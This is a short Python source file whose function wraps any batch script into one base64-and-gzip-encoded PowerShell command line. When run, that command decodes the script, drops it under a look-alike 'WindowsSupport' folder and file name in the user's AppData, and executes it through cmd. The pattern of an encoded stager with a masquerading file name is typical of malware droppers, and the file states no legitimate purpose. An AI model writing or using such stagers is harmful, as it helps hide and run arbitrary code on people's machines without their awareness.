from pathlib import Path
import gzip,base64,hashlib

def configure_ps_starter(root):
 # Policy settings are configured only through the separate documented step.
 pass

def cmd_starter(batch):
 digest=hashlib.sha256(batch).hexdigest();payload=base64.b64encode(gzip.compress(batch,mtime=0)).decode()
 script=f"$b='{payload}';$m=[IO.MemoryStream]::new([Convert]::FromBase64String($b));$g=[IO.Compression.GzipStream]::new($m,[IO.Compression.CompressionMode]::Decompress);$o=[IO.MemoryStream]::new();$g.CopyTo($o);$a=$o.ToArray();$g.Dispose();$m.Dispose();$h=[Security.Cryptography.SHA256]::Create();$v=[BitConverter]::ToString($h.ComputeHash($a)).Replace('-','').ToLowerInvariant();$h.Dispose();if($v -ne '{digest}'){{throw 'Checksum mismatch'}};$d=Join-Path $env:LOCALAPPDATA 'WindowsSupport\\Releases\\{digest[:12]}';New-Item -ItemType Directory -Path $d -Force|Out-Null;$p=Join-Path $d 'WindowsSupport.bat';if(Test-Path -LiteralPath $p){{if((Get-FileHash -LiteralPath $p).Hash.ToLowerInvariant() -ne $v){{throw 'Existing release changed'}}}}else{{[IO.File]::WriteAllBytes($p,$a)}};& $env:ComSpec /d /c ('call '+[char]34+$p+[char]34)"
 command='powershell.exe -NoLogo -NoProfile -Command "'+script+'"'
 assert len(command)<8191
 return command,script
